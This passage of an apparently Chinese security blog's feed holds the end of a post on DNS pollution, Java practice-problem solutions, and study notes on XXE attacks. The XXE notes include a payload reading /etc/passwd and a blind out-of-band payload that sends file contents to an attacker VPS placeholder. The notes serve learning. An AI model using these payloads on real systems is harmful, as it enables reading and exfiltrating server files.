DNS污染</h2><p><strong>网域服务器缓存污染</strong>（DNS cache pollution），又称<strong>域名服务器缓存投毒</strong>（DNS cache poisoning），是指一些刻意制造或无意中制造出来的域名服务器数据包，把域名指往不正确的IP地址。</p><p>一般来说，在互联网上都有可信赖的网域服务器，但为减低网络上的流量压力，一般的域名服务器都会把从上游的域名服务器获得的解析记录暂存起来，待下次有其他机器要求解析域名时，可以立即提供服务。一旦有关网域的局域域名服务器的缓存受到污染，就会把网域内的计算机导引往错误的服务器或服务器的网址。</p><h2 id="0x04-防止"><a href="#0x04-防止" class="headerlink" title="0x04 防止"></a>0x04 防止</h2><p>使用DNSCrypt对DNS请求进行加密，就可以防止DNS挟持/污染啦。使用方法就和上面写的是一样的。</p><h2 id="0x05-更新"><a href="#0x05-更新" class="headerlink" title="0x05 更新"></a>0x05 更新</h2><p>新的解决方法，使用DNS服务器:114.114.114.114</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><ul><li><a href="https://www.v2ex.com/t/694065" target="_blank" rel="noopener">https://www.v2ex.com/t/694065</a></li><li><a href="https://www.freebuf.com/articles/paper/180167.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/paper/180167.html</a></li><li><a href="https://www.williamlong.info/archives/3890.html" target="_blank" rel="noopener">https://www.williamlong.info/archives/3890.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Github-io挟持&quot;&gt;&lt;a href=&quot;#Github-io挟持&quot; class=&quot;headerlink&quot; title=&quot;Github.io挟持&quot;&gt;&lt;/a&gt;Github.io挟持&lt;/h1&gt;&lt;p&gt;像往常一样打开我的博客，发现github.io的都打不开了&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="http://bai-ren-1.github.io/2020/07/29/XXE/"/>
    <id>http://bai-ren-1.github.io/2020/07/29/XXE/</id>
    <published>2020-07-29T04:48:33.000Z</published>
    <updated>2020-09-05T05:27:58.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>本来从来没想过记录这些基础漏洞的使用方法，但这个XXE老是临到用时就忘记，就记一记吧。危害一般都是读文件、内网端口探测、攻击内网网站等 。</p><h2 id="0x00-外部实体"><a href="#0x00-外部实体" class="headerlink" title="0x00  外部实体"></a>0x00  外部实体</h2><p>XML文档结构包括：</p><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面是一份完整的XML文档定义，具有XML声明、DTD文档类型定义和文档元素三部分。上面已经展示的很直观了不多解释。</p></blockquote><p>进行XXE攻击第一步先<strong>声明XML声明</strong>，然后进行<strong>DTD文档类型的声明</strong>。</p><ul><li>内部声明DTD:</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure><ul><li>引用外部DTD:</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p> 可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。 </p></blockquote><p>其中需要知道DTD中的一些重要的关键字：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><p>XXE叫做XML外部实体注入，我们直接看如何在外部DTD文档声明中<strong>声明实体</strong>：</p><p>其中关于实体，用到最多的类型是<strong>一般实体</strong>和<strong>参数实体</strong></p><ul><li>一般实体的声明： </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>参数实体的声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>上面我们是了解不同实体之间符号的区别，主要在于格式。XXE关键还是下面的内外部实体的区分。</p></blockquote><ul><li>内部实体声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>外部实体声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>所以区分内/外部实体和区分内/外部DTD是一样的，有SYSTEM标识符就是外部的，否则为内部的。</p></blockquote><p>只要如何声明实体后我们还得知道如何<strong>引用实体</strong>：</p><ul><li>参数实体用%实体名称申明，引用时也用%实体名称。</li><li>其余实体直接用实体名称申明，引用时用&amp;实体名称。</li><li>参数实体只能在DTD中申明，DTD中引用。</li><li>其余实体只能在DTD中申明，可在xml文档中引用。 </li></ul><p>最后贴上外部实体在每种不同的环境下默认可以<strong>使用的协议</strong>列表。</p><p><img src="/2020/07/29/XXE/1.png" alt></p><p>结合着上面知识来一个XXE的最常见payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;passwd;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面先是声明是个XML文档，随后声明一个内部DTD文档。DTD文档中通过SYSTEM标识符声明了一个外部实体passwd。然后XML文档元素中通&amp;进行外部实体的引用。</p></blockquote><h2 id="0x01-基础攻击"><a href="#0x01-基础攻击" class="headerlink" title="0x01 基础攻击"></a>0x01 基础攻击</h2><blockquote><p>基础的XXE注入— 外部实体注入本地DTD。</p></blockquote><p>下面这张图片用的是一个挺有名的XXE测试靶场，懒得复现就直接提上来。这里就是直接引入一个内部DTD，里面声明了外部实体获取/etc/passwd/的内容然后解析出来并获取解析的结果。</p><p><img src="/2020/07/29/XXE/2.png" alt></p><p>但很多时候解析之后的结果不会给你看到，那就需要盲注的手法了。</p><h2 id="0x02-盲注攻击"><a href="#0x02-盲注攻击" class="headerlink" title="0x02 盲注攻击"></a>0x02 盲注攻击</h2><blockquote><p>基于盲注的XXE注入—XML解析器在响应中不显示任何错误。</p></blockquote><p>首先在自己的VPS上准备好test.dtd作为一会引入的外部dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在XXE漏洞服务器上发送payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>然后在VPS的9999端口监听，获取到敏感信息的内容</p><p><img src="/2020/07/29/XXE/3.png" alt></p><p>总结上面XXE盲打的调用过程：</p><ul><li>payload中连续调用了三个参数实体 %remote;%int;%send。</li><li>调用%remote实体后请求了VPS上的 test.dtd ，类似于将 test.dtd 包含进来。</li><li>调用%int实体调用了test.dtd 中的%file实体，%file实体获取文件内容并填入到%send实体的内容中。</li><li>调用%send实体把需要的数据发送到VPS的监听端口上。</li></ul><h2 id="0x03-显错攻击"><a href="#0x03-显错攻击" class="headerlink" title="0x03 显错攻击"></a>0x03 显错攻击</h2><blockquote><p>基于错误的XXE注入—成功解析之后，XML解析器始终显示SAME响应。（即“您的消息已被接收”），因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</p></blockquote><p>有时候，当解析过程成功时，当我们从服务器得到通用的响应时，我们可能希望服务器返回详细错误—因此，我们可以使用与远程DTD相同的技术，但会发生故意的错误如： </p><p><img src="/2020/07/29/XXE/4.png" alt></p><p>解析器将尝试解析DTD并访问发送实体中给出的路径，但是由于不能到达“my-evil-domain.$$$$”，我们将导致以下错误： </p><p><img src="/2020/07/29/XXE/5.png" alt></p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><ul><li><a href="https://www.secpulse.com/archives/58915.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/58915.html</a> </li><li><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a> </li><li><a href="https://www.jianshu.com/p/7325b2ef8fc9" target="_blank" rel="noopener">https://www.jianshu.com/p/7325b2ef8fc9</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XXE&quot;&gt;&lt;a href=&quot;#XXE&quot; class=&quot;headerlink&quot; title=&quot;XXE&quot;&gt;&lt;/a&gt;XXE&lt;/h1&gt;&lt;p&gt;本来从来没想过记录这些基础漏洞的使用方法，但这个XXE老是临到用时就忘记，就记一记吧。危害一般都是读文件、内网端口探测、攻击内网网站
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>OJ刷题记录</title>
    <link href="http://bai-ren-1.github.io/2020/07/27/OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://bai-ren-1.github.io/2020/07/27/OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-27T12:54:58.000Z</published>
    <updated>2020-07-27T13:22:18.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OJ刷题记录"><a href="#OJ刷题记录" class="headerlink" title="OJ刷题记录"></a>OJ刷题记录</h1><p>菜，刷。两个字。大部分题目放在本地的IDEA中了，这里只是贴上一些老是忘记的点。</p><h2 id="0x00-华为OJ"><a href="#0x00-华为OJ" class="headerlink" title="0x00 华为OJ"></a>0x00 华为OJ</h2><h3 id="1-计算字符串个数"><a href="#1-计算字符串个数" class="headerlink" title="1. 计算字符串个数"></a>1. 计算字符串个数</h3><h4 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h4><p>这题难度标注是较难，个人感觉应该是标错了或者有更优解。不过搞安全的，这里不去探究最优解了，AC即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">题目描述</span></span><br><span class="line"><span class="comment">写出一个程序，接受一个由字母和数字组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:</span></span><br><span class="line"><span class="comment">第一行输入一个有字母和数字以及空格组成的字符串，第二行输入一个字符。</span></span><br><span class="line"><span class="comment">输出描述:</span></span><br><span class="line"><span class="comment">输出输入字符串中含有该字符的个数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入:</span></span><br><span class="line"><span class="comment">ABCDEF</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">输出:1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> NumOfAlpha;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String string = scanner.nextLine();</span><br><span class="line">        String alpha = scanner.nextLine();</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:string.toCharArray())&#123;</span><br><span class="line">            String str;</span><br><span class="line">            str = Character.toString(ch);</span><br><span class="line">            <span class="keyword">if</span>(str.equalsIgnoreCase(alpha))&#123;      <span class="comment">// 比较两个String不能直接用==进行判断，需要使用equals方法</span></span><br><span class="line">                result++;                         <span class="comment">// 必须使用equalsIgnoreCase才能通过，直接equals不行</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点"><a href="#题目坑点" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li><strong>String类型</strong>比较不同对象内容是否相同，应该用equals。因为==用于比较引用类型和比较基本数据类型时具有不同的功能。 </li><li>equalsIgnoreCase() ：用于将字符串与指定的对象比较，<strong>不考虑大小写</strong>。</li><li>for(char ch:string.toCharArray())：常用于<strong>String转Char数组并遍历</strong>。</li></ul><h3 id="2-输出逆序的字符串"><a href="#2-输出逆序的字符串" class="headerlink" title="2. 输出逆序的字符串"></a>2. 输出逆序的字符串</h3><h4 id="题目概述-1"><a href="#题目概述-1" class="headerlink" title="题目概述"></a>题目概述</h4><p>标注简单，主要是记录老是要忘的字符串和字符之间的转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">将一个字符串str的内容颠倒过来，并输出。str的长度不超过100个字符。</span></span><br><span class="line"><span class="comment">如：输入“I am a student”，输出“tneduts a ma I”。</span></span><br><span class="line"><span class="comment">输入参数：inputString：输入的字符串</span></span><br><span class="line"><span class="comment">返回值：输出转换好的逆序字符串</span></span><br><span class="line"><span class="comment">输入描述：输入一个字符串，可以有空格</span></span><br><span class="line"><span class="comment">输出描述：输出逆序的字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：I am a student</span></span><br><span class="line"><span class="comment">输出：tneduts a ma I</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> Easy.ReverseString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String string = scanner.nextLine();</span><br><span class="line">        <span class="keyword">int</span> num = string.length();</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();  <span class="comment">// 用来将字符拼接成字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            Character word = string.charAt(num-<span class="number">1</span>-i);</span><br><span class="line">            stringBuilder.append(word);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(stringBuilder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-1"><a href="#题目坑点-1" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>StringBuilder类似Python中的数组的方法来实现<strong>把字符添加在一个结构</strong>。</li><li>StringBuilder使用<strong>toString</strong>实现添加在一起的字符转为字符串。</li><li>charAt实现<strong>字符串提取某个字符</strong>。</li></ul><h3 id="3-最小公倍数"><a href="#3-最小公倍数" class="headerlink" title="3. 最小公倍数"></a>3. 最小公倍数</h3><h4 id="题目概述-2"><a href="#题目概述-2" class="headerlink" title="题目概述"></a>题目概述</h4><p>经典，没啥好解释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">题目描述</span></span><br><span class="line"><span class="comment">正整数A和正整数B 的最小公倍数是指 能被A和B整除的最小的正整数值，设计一个算法，求输入A和B的最小公倍数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:</span></span><br><span class="line"><span class="comment">输入两个正整数A和B。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出描述:</span></span><br><span class="line"><span class="comment">输出A和B的最小公倍数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：5 7</span></span><br><span class="line"><span class="comment">输出：35</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> Easy.TheMinimumMultiple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="keyword">int</span> a = scanner.nextInt();</span><br><span class="line">            <span class="keyword">int</span> b = scanner.nextInt();</span><br><span class="line">            <span class="keyword">int</span> maximumConventions = MaximumConventions(a,b);</span><br><span class="line">            System.out.println(a*b/maximumConventions);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">MaximumConventions</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(a &lt; b)&#123;  <span class="comment">// 保证被除数大于除数</span></span><br><span class="line">            <span class="keyword">int</span> temp = a;</span><br><span class="line">            a = b;</span><br><span class="line">            b = temp;</span><br><span class="line">        &#125;<span class="keyword">while</span>(a % b != <span class="number">0</span>)&#123;     <span class="comment">// 除法余数不为0则循环</span></span><br><span class="line">            n = a % b;</span><br><span class="line">            a = b;      <span class="comment">// 大数改小数</span></span><br><span class="line">            b = n;      <span class="comment">// 小数改更小</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;       <span class="comment">// 最后返回小的数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-2"><a href="#题目坑点-2" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>记住<strong>辗转相除法</strong>的返回值是小的数而非余数。</li><li>记住计算最小公倍数的公式。</li></ul><h3 id="4-漂亮度"><a href="#4-漂亮度" class="headerlink" title="4. 漂亮度"></a>4. 漂亮度</h3><h4 id="题目概述-3"><a href="#题目概述-3" class="headerlink" title="题目概述"></a>题目概述</h4><p>挺有意思的，思路就是统计字母个数，最多个数的占最大漂亮度然后依此类推。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">给出一个名字，该名字有26个字符串组成，定义这个字符串的“漂亮度”是其所有字母“漂亮度”的总和。</span></span><br><span class="line"><span class="comment">每个字母都有一个“漂亮度”，范围在1到26之间。没有任何两个字母拥有相同的“漂亮度”。字母忽略大小写。</span></span><br><span class="line"><span class="comment">给出多个名字，计算每个名字最大可能的“漂亮度”。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:整数N，后续N个名字</span></span><br><span class="line"><span class="comment">输出描述:每个名称可能的最大漂亮程度</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">zhangsan</span></span><br><span class="line"><span class="comment">lisi</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">192</span></span><br><span class="line"><span class="comment">101</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> Normal.Beauty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> num = scanner.nextInt();</span><br><span class="line">        String[] names = <span class="keyword">new</span> String[num];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            Scanner scanner1 = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            names[i] = scanner1.nextLine();</span><br><span class="line">            <span class="comment">// System.out.println(names[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            beauty(names[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beauty</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; hm = <span class="keyword">new</span> HashMap&lt;Character, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch:name.toCharArray())&#123;</span><br><span class="line">            <span class="keyword">if</span>(hm.containsKey(ch))&#123;</span><br><span class="line">                hm.put(ch,hm.get(ch)+<span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                hm.put(ch,<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Collection&lt;Integer&gt; coll = 